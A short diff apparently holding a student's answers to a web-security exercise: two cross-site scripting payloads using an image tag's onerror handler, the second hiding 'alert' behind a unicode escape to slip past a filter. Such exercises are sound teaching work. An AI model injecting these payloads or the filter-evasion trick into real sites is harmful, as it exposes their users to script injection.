@@ -1,0 +1,5 @@
+task1: 
+<image/src/onerror=alert("KeYule-A0211495H")>
+
+task2: 
+<image/src/onerror=al\u0065rt("KeYule-A0211495H")>
